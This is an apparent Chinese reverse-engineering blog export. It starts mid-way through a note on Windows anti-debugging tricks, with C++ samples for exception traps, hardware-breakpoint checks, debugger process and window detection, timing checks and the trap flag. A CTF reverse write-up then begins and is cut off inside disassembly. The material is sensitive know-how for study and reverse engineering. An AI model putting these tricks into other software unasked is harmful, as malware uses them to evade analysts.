NULL)<br>正常情况下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">CloseHandle</span>(<span class="hljs-number">0xDEADBEEF</span>) <span class="hljs-comment">// 返回 FALSE</span><br><span class="hljs-built_in">GetLastError</span>() <span class="hljs-comment">// ERROR_INVALID_HANDLE</span><br></code></pre></td></tr></table></figure><p>调试器存在时:将引发EXCEPTION_INVALID_HANDLE（0xC0000008）异常，这个异常可以被一个异常处理程序缓存起来;如果控制被传递给异常处理程序，就表明有一个调试器存在</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Check</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __try<br>    &#123;<br>        <span class="hljs-built_in">CloseHandle</span>((HANDLE)<span class="hljs-number">0xDEADBEEF</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    __except (EXCEPTION_INVALID_HANDLE == <span class="hljs-built_in">GetExceptionCode</span>()<br>                ? EXCEPTION_EXECUTE_HANDLER <br>                : EXCEPTION_CONTINUE_SEARCH)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>int 3 或者除零异常</strong> &#x3D;&gt; CPU 异常触发<br><strong>int 3</strong>:<br>断点分为三种:软件断点、硬件断点和内存断点</p><p>软件断点的本质是把下断点的指令的第一个字节替换成了 <strong>0xCC</strong>,即汇编 int 3 指令，当 eip 指令到到该位置时，发现 int3 指令，将会触发一个异常中断(EXCEPTION_BREAKPOINT 异常（异常码 0x80000003）)，这个异常就被调试器捕捉到，程序也因此中断；断点中断时，0xCC 恢复为原来的指令，中断运行之后，又恢复为 0xCC<br>xdbg 中可以让调试器直接忽略 int3 异常；逆向绕过的话直接把 int 3 nop 掉即可</p><blockquote><p>硬件断点：通过 CPU 内部的调试寄存器来实现, DR0-DR3 用于存放断点地址，Dr4，Dr5一般不使用, DR6 用于记录断点状态，DR7 是调试控制寄存器，设置断点类型、长度和启用状态；反调试可以通过访问相关寄存器来判断是否有硬件断点被设置，如果发现 DR0-DR3 中有非零值，则可能有调试器存在</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">CONTEXT ctx;<br>ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;<br><span class="hljs-built_in">GetThreadContext</span>(<span class="hljs-built_in">GetCurrentThread</span>(), &amp;ctx);<br><span class="hljs-keyword">if</span> (ctx.Dr0 != <span class="hljs-number">0</span> || ctx.Dr1 != <span class="hljs-number">0</span> || ctx.Dr2 != <span class="hljs-number">0</span> || ctx.Dr3 != <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-comment">// 检测到硬件断点，触发反调试行为</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>除零</strong>:<br>CPU 执行 <code>DIV reg, 0</code> 时，会触发 EXCEPTION_INT_DIVIDE_BY_ZERO 异常（异常码 0xC0000094）<br>调试器同样会先拦截 CPU 异常，程序可以利用 SEH &#x2F; VEH 捕获异常，检查调试器是否存在</p><p>SEH（线程级结构化异常处理）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">__try &#123;<br>    __asm &#123; <span class="hljs-type">int</span> <span class="hljs-number">3</span> &#125;        <span class="hljs-comment">// 或除零： xor eax,eax / div eax</span><br>&#125;<br>__except(EXCEPTION_EXECUTE_HANDLER) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;异常被程序捕获\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>VEH(向量化异常处理)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">LONG CALLBACK <span class="hljs-title">VectoredHandler</span><span class="hljs-params">(EXCEPTION_POINTERS* p)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (p-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_BREAKPOINT)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INT3 异常被捕获\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<br>&#125;<br><br><span class="hljs-built_in">AddVectoredExceptionHandler</span>(<span class="hljs-number">1</span>, VectoredHandler);<br>__asm &#123; <span class="hljs-type">int</span> <span class="hljs-number">3</span> &#125;<br></code></pre></td></tr></table></figure><p>调试器不存在时，触发异常之后异常进入 SEH&#x2F;VEH，程序捕获，判断正常，程序继续执行<br>调试器存在时，异常被调试器捕获，程序中断或者篡改异常，程序捕获不到异常，判断被调试</p><h3 id="进程名反调试"><a href="#进程名反调试" class="headerlink" title="进程名反调试"></a>进程名反调试</h3><p>程序在运行时枚举系统进程列表，查找已知调试器的进程名（比如 ida.exe、x64dbg.exe 等）。如果发现匹配项，就认为程序正被外部调试器调试，进而采取相应措施（退出、限制功能、触发误导逻辑等）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-comment">// Check if a debugger process is running</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsDebuggerProcessRunning</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* debuggerNames[] = &#123;<br>        <span class="hljs-string">L&quot;ollydbg.exe&quot;</span>,<br>        <span class="hljs-string">L&quot;x64dbg.exe&quot;</span>,<br>        <span class="hljs-string">L&quot;ida.exe&quot;</span>,<br>        <span class="hljs-string">L&quot;ida64.exe&quot;</span>,<br>        <span class="hljs-string">L&quot;windbg.exe&quot;</span><br>    &#125;;<br><br>    <span class="hljs-comment">// Create a snapshot of all processes</span><br>    HANDLE hSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;<br>        std::wcerr &lt;&lt; <span class="hljs-string">L&quot;Error CreateToolhelp32Snapshot failed&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    PROCESSENTRY32W pe32;<br>    pe<span class="hljs-number">32.</span>dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32W);<br><br>    <span class="hljs-comment">// Enumerate processes</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Process32FirstW</span>(hSnapshot, &amp;pe32)) &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; dbgName : debuggerNames) &#123;<br>                <span class="hljs-keyword">if</span> (_wcsicmp(pe<span class="hljs-number">32.</span>szExeFile, dbgName) == <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-built_in">CloseHandle</span>(hSnapshot);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// Found debugger process</span><br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32NextW</span>(hSnapshot, &amp;pe32));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        std::wcerr &lt;&lt; <span class="hljs-string">L&quot;Error Process32FirstW failed&quot;</span> &lt;&lt; std::endl;<br>    &#125;<br><br>    <span class="hljs-built_in">CloseHandle</span>(hSnapshot);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// No debugger process found</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsDebuggerProcessRunning</span>()) &#123;<br>        std::wcout &lt;&lt; <span class="hljs-string">L&quot;Debugger process detected exiting&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        std::wcout &lt;&lt; <span class="hljs-string">L&quot;No debugger process detected&quot;</span> &lt;&lt; std::endl;<br>    &#125;<br><br>    <span class="hljs-comment">// Normal program logic</span><br>    std::wcout &lt;&lt; <span class="hljs-string">L&quot;Program is running&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="窗口名反调试"><a href="#窗口名反调试" class="headerlink" title="窗口名反调试"></a>窗口名反调试</h3><p>大多数调试器在运行时会创建一个主窗口，且这个窗口会带有比较固定的标题文本（窗口名），例如：x64dbg 窗口标题含有 “x64dbg”,<br>IDA 窗口标题含有 “IDA”,利用这一点，程序可以调用 Windows API（例如 EnumWindows + GetWindowText）来遍历系统中所有顶层窗口，检查是否存在这些关键词,如果找到，就说明调试器可能正在运行，从而触发反调试行为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-comment">// 要检查的调试器窗口关键词（宽字符）</span><br><span class="hljs-type">const</span> std::vector&lt;std::wstring&gt; debuggerWindowNames = &#123;<br>    <span class="hljs-string">L&quot;OllyDbg&quot;</span>,<br>    <span class="hljs-string">L&quot;x64dbg&quot;</span>,<br>    <span class="hljs-string">L&quot;IDA&quot;</span>,<br>    <span class="hljs-string">L&quot;WinDbg&quot;</span><br>&#125;;<br><br><span class="hljs-comment">// 转小写辅助函数</span><br><span class="hljs-function">std::wstring <span class="hljs-title">ToLower</span><span class="hljs-params">(<span class="hljs-type">const</span> std::wstring&amp; str)</span> </span>&#123;<br>    std::wstring lower = str;<br>    std::<span class="hljs-built_in">transform</span>(lower.<span class="hljs-built_in">begin</span>(), lower.<span class="hljs-built_in">end</span>(), lower.<span class="hljs-built_in">begin</span>(), ::towlower);<br>    <span class="hljs-keyword">return</span> lower;<br>&#125;<br><br><span class="hljs-comment">// 枚举窗口回调</span><br><span class="hljs-function">BOOL CALLBACK <span class="hljs-title">EnumWindowsProc</span><span class="hljs-params">(HWND hwnd, LPARAM lParam)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">IsWindowVisible</span>(hwnd))  <span class="hljs-comment">// 只检查可见窗口，减少误报</span><br>        <span class="hljs-keyword">return</span> TRUE;<br><br>    <span class="hljs-type">wchar_t</span> windowTitle[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> length = <span class="hljs-built_in">GetWindowTextW</span>(hwnd, windowTitle, <span class="hljs-built_in">sizeof</span>(windowTitle) / <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>));<br><br>    <span class="hljs-keyword">if</span> (length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-function">std::wstring <span class="hljs-title">title</span><span class="hljs-params">(windowTitle)</span></span>;<br>        std::wstring lowerTitle = <span class="hljs-built_in">ToLower</span>(title);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; debuggerName : debuggerWindowNames) &#123;<br>            <span class="hljs-keyword">if</span> (lowerTitle.<span class="hljs-built_in">find</span>(<span class="hljs-built_in">ToLower</span>(debuggerName)) != std::wstring::npos) &#123;<br>                std::wcout &lt;&lt; <span class="hljs-string">L&quot;Debugger window detected: &quot;</span> &lt;&lt; title &lt;&lt; std::endl;<br>                <span class="hljs-built_in">SetLastError</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 标记为“检测到”，避免与 API 错误混淆</span><br>                <span class="hljs-keyword">return</span> FALSE;    <span class="hljs-comment">// 停止枚举</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE; <span class="hljs-comment">// 继续枚举</span><br>&#125;<br><br><span class="hljs-comment">// 检查是否存在调试器窗口</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsDebuggerWindowOpen</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">SetLastError</span>(<span class="hljs-number">0</span>);<br>    BOOL success = <span class="hljs-built_in">EnumWindows</span>(EnumWindowsProc, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!success) &#123;<br>        DWORD err = <span class="hljs-built_in">GetLastError</span>();<br>        <span class="hljs-keyword">if</span> (err == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">// 回调返回 FALSE -&gt; 检测到调试器</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            std::cerr &lt;&lt; <span class="hljs-string">&quot;EnumWindows failed with error: &quot;</span> &lt;&lt; err &lt;&lt; std::endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsDebuggerWindowOpen</span>()) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;Debugger window detected! Exiting...&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;No debugger window detected.&quot;</span> &lt;&lt; std::endl;<br>    &#125;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Program is running.&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="时间检测反调试"><a href="#时间检测反调试" class="headerlink" title="时间检测反调试"></a>时间检测反调试</h3><p>程序在正常环境下运行的速度与在调试器或模拟器下运行的速度有显著差异，调试器逐行执行程序时，每条指令之间会有额外延迟，模拟器的指令执行速度也远低于真实 CPU，因此，可以通过测量运行时间是否异常来判断是否被调试</p><p>程序测量时间间隔主要有两种方法:<br>1.通过 CPU 或系统高精度计数器测量时间差</p><table><thead><tr><th>函数名</th><th>说明</th></tr></thead><tbody><tr><td>RDTSC</td><td>CPU 内部时间戳计数器，直接读取 CPU 周期数，精度最高</td></tr><tr><td>NtQueryPerformanceCounter &#x2F; QueryPerformanceCounter</td><td>Windows 高精度性能计数器，基于硬件计时器</td></tr><tr><td>GetTickCount</td><td>返回自系统启动以来的毫秒数，精度较低</td></tr></tbody></table><p>2.通过系统提供的时间 API 测量时间间隔</p><table><thead><tr><th>函数名</th><th>说明</th></tr></thead><tbody><tr><td>timeGetTime()</td><td>返回自系统启动以来的毫秒数，类似 GetTickCount，但精度略高</td></tr><tr><td>_ftime()</td><td>返回当前时间（精确到毫秒），主要用于 C 语言计时</td></tr></tbody></table><h3 id="单步执行反调试"><a href="#单步执行反调试" class="headerlink" title="单步执行反调试"></a>单步执行反调试</h3><p>在 x86&#x2F;x64 CPU 中，有一个陷阱标志 Trap Flag (TF) 位（在 EFLAGS&#x2F;RFLAGS 寄存器中），如果 Trap Flag &#x3D; 1 ，CPU 就进入单步模式<br>在单步模式下，每执行一条指令，CPU 会触发一次 Debug Exception (#DB, 0x1)，#DB 异常被封装为 EXCEPTION_SINGLE_STEP ,调试器会捕获这个异常，再把这个异常与 SEH 结合即可实现反调试</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function">BOOL <span class="hljs-title">IsDebuggerPresent_SingleStep</span><span class="hljs-params">()</span> </span>&#123;<br>    __try &#123;<br>        __asm &#123;<br>            pushfd;                  <span class="hljs-comment">// 将当前EFLAGS寄存器值压栈</span><br>            <span class="hljs-keyword">or</span> dword ptr [esp], <span class="hljs-number">0x100</span>; <span class="hljs-comment">// 将栈上EFLAGS值的 TF 位 设置为1</span><br>            popfd;                   <span class="hljs-comment">// 将修改后的值弹回EFLAGS寄存器，此时 TF=1</span><br>            nop;                    <span class="hljs-comment">// 这是一条会被单步执行的指令（可以是任何指令）</span><br>        &#125;<br>        <span class="hljs-comment">// 如果程序执行到了这里，说明单步异常被处理了-&gt;有调试器</span><br>        <span class="hljs-keyword">return</span> TRUE;<br>    &#125;<br>    __except(EXCEPTION_EXECUTE_HANDLER) &#123;<br>        <span class="hljs-comment">// 如果程序跳转到了这个异常处理块，说明单步异常未被调试器处理，而是被 SEH 捕获了-&gt;无调试器</span><br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsDebuggerPresent_SingleStep</span>()) &#123;<br>        <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Debugger Detected!&quot;</span>, <span class="hljs-string">&quot;Alert&quot;</span>, MB_OK);<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">-1</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;All Clear!&quot;</span>, <span class="hljs-string">&quot;Hello&quot;</span>, MB_OK);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/PaperPlaneFly/p/18474056">https://www.cnblogs.com/PaperPlaneFly/p/18474056</a><br><a href="https://bbs.kanxue.com/thread-259098.htm">https://bbs.kanxue.com/thread-259098.htm</a><br><a href="https://whitebird0.github.io/post/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF">https://whitebird0.github.io/post/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF</a><br><a href="https://sgsgsama.github.io/ctf/re-hints/%E5%8F%8D%E8%B0%83%E8%AF%95/#more">https://sgsgsama.github.io/ctf/re-hints/%E5%8F%8D%E8%B0%83%E8%AF%95/#more</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Anti-debugging</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NPC²CTF 2025 Reverse 方向复现</title>
    <link href="/2025/08/26/NPCCTF2025/"/>
    <url>/2025/08/26/NPCCTF2025/</url>
    
    <content type="html"><![CDATA[<h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="esrever"><a href="#esrever" class="headerlink" title="esrever"></a>esrever</h3><h4 id="主逻辑"><a href="#主逻辑" class="headerlink" title="主逻辑"></a>主逻辑</h4><p>ida 中点击发现在 main 和 start 之间无限跳转，搜索字符串再 x 交叉引用到关键汇编，发现这部分汇编全部飘红，反编译失败</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001110</span>                 <span class="hljs-keyword">jmp</span>     loc_1286<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001115</span> <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001115</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">cs</span>:byte_4080<br><span class="hljs-symbol">.text:</span>000000000000111C                 <span class="hljs-keyword">jmp</span>     short loc_1152<br><span class="hljs-symbol">.text:</span>000000000000111E <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>000000000000111E<br><span class="hljs-symbol">.text:</span>000000000000111E loc_111E:                               <span class="hljs-comment">; CODE XREF: .text:loc_12B0↓j</span><br><span class="hljs-symbol">.text:</span>000000000000111E                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001123</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001125</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aRight     <span class="hljs-comment">; &quot;Right!&quot;</span><br><span class="hljs-symbol">.text:</span>000000000000112C                 <span class="hljs-keyword">jmp</span>     short loc_115D<br><span class="hljs-symbol">.text:</span>000000000000112E <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>000000000000112E<br><span class="hljs-symbol">.text:</span>000000000000112E loc_112E:                               